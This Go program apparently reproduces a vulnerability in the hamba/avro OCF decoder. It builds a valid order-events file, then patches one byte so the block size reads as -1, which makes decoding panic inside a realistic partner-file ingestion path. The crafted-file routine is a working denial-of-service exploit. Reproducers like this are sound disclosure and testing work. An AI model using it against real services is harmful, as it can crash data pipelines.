package main

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"

	"github.com/hamba/avro/v2/ocf"
)

const orderSchema = `{
	"type": "record",
	"name": "OrderEvent",
	"namespace": "production.ingestion",
	"fields": [
		{"name": "order_id", "type": "string"},
		{"name": "customer_id", "type": "string"},
		{"name": "amount_cents", "type": "long"},
		{"name": "currency", "type": "string"},
		{"name": "source", "type": "string"}
	]
}`

type OrderEvent struct {
	OrderID     string `avro:"order_id"`
	CustomerID  string `avro:"customer_id"`
	AmountCents int64  `avro:"amount_cents"`
	Currency    string `avro:"currency"`
	Source      string `avro:"source"`
}

type Result struct {
	Records      int
	Panicked     bool
	PanicValue   any
	DecoderError error
}

func main() {
	dir, err := os.MkdirTemp("", "avro-ocf-ingestion-*")
	if err != nil {
		fatal("create temp dir", err)
	}
	defer os.RemoveAll(dir)

	goodPath := filepath.Join(dir, "orders-good.avro")
	badPath := filepath.Join(dir, "orders-bad.avro")
	sync := fixedSyncMarker()

	if err := writePartnerFile(goodPath, sync); err != nil {
		fatal("write valid partner file", err)
	}
	if err := cloneWithNegativeBlockSize(goodPath, badPath, sync); err != nil {
		fatal("prepare crafted partner file", err)
	}

	good, err := ingestPartnerOCF(goodPath)
	if err != nil {
		fatal("ingest valid file", err)
	}
	fmt.Printf("valid file decoded records: %d\n", good.Records)

	bad, err := ingestPartnerOCF(badPath)
	if err != nil {
		fatal("ingest crafted file", err)
	}
	fmt.Printf("crafted file decoded records before panic: %d\n", bad.Records)
	fmt.Printf("decoder error after crafted HasNext: %v\n", bad.DecoderError)
	if !bad.Panicked {
		fmt.Println("crafted file did not panic; vulnerability was not reached")
		os.Exit(1)
	}

	fmt.Printf("observed panic: %v\n", bad.PanicValue)

	if err := demonstrateReceivedEventBytes(goodPath, sync); err != nil {
		fatal("demonstrate received event bytes", err)
	}
}

func writePartnerFile(path string, sync [16]byte) error {
	events := []OrderEvent{
		{OrderID: "ord-1001", CustomerID: "cust-44", AmountCents: 1299, Currency: "EUR", Source: "checkout"},
		{OrderID: "ord-1002", CustomerID: "cust-57", AmountCents: 4599, Currency: "EUR", Source: "subscription"},
		{OrderID: "ord-1003", CustomerID: "cust-19", AmountCents: 999, Currency: "EUR", Source: "checkout"},
	}

	f, err := os.OpenFile(path, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()

	enc, err := ocf.NewEncoder(orderSchema, f,
		ocf.WithSyncBlock(sync),
		ocf.WithBlockLength(1000),
		ocf.WithMetadataKeyVal("producer", []byte("partner-orders-v1")),
	)
	if err != nil {
		return err
	}

	for _, event := range events {
		if err := enc.Encode(event); err != nil {
			return err
		}
	}
	if err := enc.Close(); err != nil {
		return err
	}
	return f.Sync()
}

func ingestPartnerOCF(path string) (Result, error) {
	var result Result

	if err := validateSourceFile(path); err != nil {
		return result, err
	}

	f, err := os.Open(path)
	if err != nil {
		return result, err
	}
	defer f.Close()

	dec, err := ocf.NewDecoder(io.LimitReader(f, 1<<20))
	if err != nil {
		return result, err
	}
	defer dec.Close()

	if err := validateContainerMetadata(dec); err != nil {
		return result, err
	}

	func() {
		defer func() {
			if r := recover(); r != nil {
				result.Panicked = true
				result.PanicValue = r
				result.DecoderError = dec.Error()
				debug.PrintStack()
			}
		}()

		for dec.HasNext() {
			var event OrderEvent
			if err := dec.Decode(&event); err != nil {
				result.DecoderError = err
				return
			}
			if err := validateOrderEvent(event); err != nil {
				result.DecoderError = err
				return
			}
			result.Records++
		}
		result.DecoderError = dec.Error()
	}()

	return result, nil
}

func demonstrateReceivedEventBytes(validPath string, sync [16]byte) error {
	validBytes, err := os.ReadFile(validPath)
	if err != nil {
		return err
	}

	craftedBytes, blockStart, err := bytesWithNegativeBlockSize(validBytes, sync)
	if err != nil {
		return err
	}

	fmt.Println()
	fmt.Println("received event bytes demonstration:")
	fmt.Printf("valid OCF event batch length: %d bytes\n", len(validBytes))
	fmt.Printf("malicious field offset: %d\n", blockStart+1)
	fmt.Printf("bytes around block header before: % x\n", validBytes[blockStart:blockStart+8])
	fmt.Printf("bytes around block header after:  % x\n", craftedBytes[blockStart:blockStart+8])
	fmt.Println("meaning: record count stays 0x06 (3 records), block size becomes 0x01 (Avro long -1)")

	result, err := ingestReceivedEventBytes(craftedBytes)
	if err != nil {
		return err
	}
	fmt.Printf("received crafted bytes decoded records before panic: %d\n", result.Records)
	fmt.Printf("received crafted bytes decoder error after HasNext: %v\n", result.DecoderError)
	fmt.Printf("received crafted bytes panic: %v\n", result.PanicValue)
	return nil
}

func ingestReceivedEventBytes(payload []byte) (Result, error) {
	var result Result

	if len(payload) == 0 || len(payload) > 1<<20 {
		return result, fmt.Errorf("rejecting unexpected payload size: %d", len(payload))
	}

	dec, err := ocf.NewDecoder(bytes.NewReader(payload))
	if err != nil {
		return result, err
	}
	defer dec.Close()

	if err := validateContainerMetadata(dec); err != nil {
		return result, err
	}

	func() {
		defer func() {
			if r := recover(); r != nil {
				result.Panicked = true
				result.PanicValue = r
				result.DecoderError = dec.Error()
			}
		}()

		for dec.HasNext() {
			var event OrderEvent
			if err := dec.Decode(&event); err != nil {
				result.DecoderError = err
				return
			}
			if err := validateOrderEvent(event); err != nil {
				result.DecoderError = err
				return
			}
			result.Records++
		}
		result.DecoderError = dec.Error()
	}()

	return result, nil
}

func validateSourceFile(path string) error {
	if filepath.Ext(path) != ".avro" {
		return fmt.Errorf("rejecting non-avro file: %s", path)
	}

	info, err := os.Stat(path)
	if err != nil {
		return err
	}
	if !info.Mode().IsRegular() {
		return errors.New("rejecting non-regular file")
	}
	if info.Size() == 0 || info.Size() > 1<<20 {
		return fmt.Errorf("rejecting unexpected file size: %d", info.Size())
	}
	return nil
}

func validateContainerMetadata(dec *ocf.Decoder) error {
	meta := dec.Metadata()
	if string(meta["producer"]) != "partner-orders-v1" {
		return errors.New("rejecting unexpected producer metadata")
	}
	if string(meta["avro.codec"]) != "null" {
		return fmt.Errorf("rejecting unexpected codec: %q", string(meta["avro.codec"]))
	}
	if !strings.Contains(dec.Schema().String(), "OrderEvent") {
		return fmt.Errorf("rejecting unexpected schema: %s", dec.Schema())
	}
	return nil
}

func validateOrderEvent(event OrderEvent) error {
	if event.OrderID == "" || event.CustomerID == "" {
		return errors.New("empty order or customer id")
	}
	if event.AmountCents <= 0 {
		return errors.New("non-positive amount")
	}
	if event.Currency != "EUR" {
		return fmt.Errorf("unsupported currency: %s", event.Currency)
	}
	return nil
}

func cloneWithNegativeBlockSize(src, dst string, sync [16]byte) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	out, _, err := bytesWithNegativeBlockSize(data, sync)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, out, 0o600)
}

func bytesWithNegativeBlockSize(data []byte, sync [16]byte) ([]byte, int, error) {
	headerSyncAt := bytes.Index(data, sync[:])
	if headerSyncAt == -1 {
		return nil, 0, errors.New("sync marker not found")
	}
	blockStart := headerSyncAt + len(sync)
	if blockStart+2 >= len(data) {
		return nil, 0, errors.New("block header missing")
	}
	if data[blockStart] != 0x06 {
		return nil, 0, fmt.Errorf("unexpected generated block count encoding: 0x%02x", data[blockStart])
	}

	out := append([]byte(nil), data...)
	out[blockStart+1] = 0x01
	return out, blockStart, nil
}

func fixedSyncMarker() [16]byte {
	var sync [16]byte
	copy(sync[:], []byte("orders-sync-v001"))
	return sync
}

func fatal(step string, err error) {
	fmt.Printf("%s failed: %v\n", step, err)
	os.Exit(2)
}
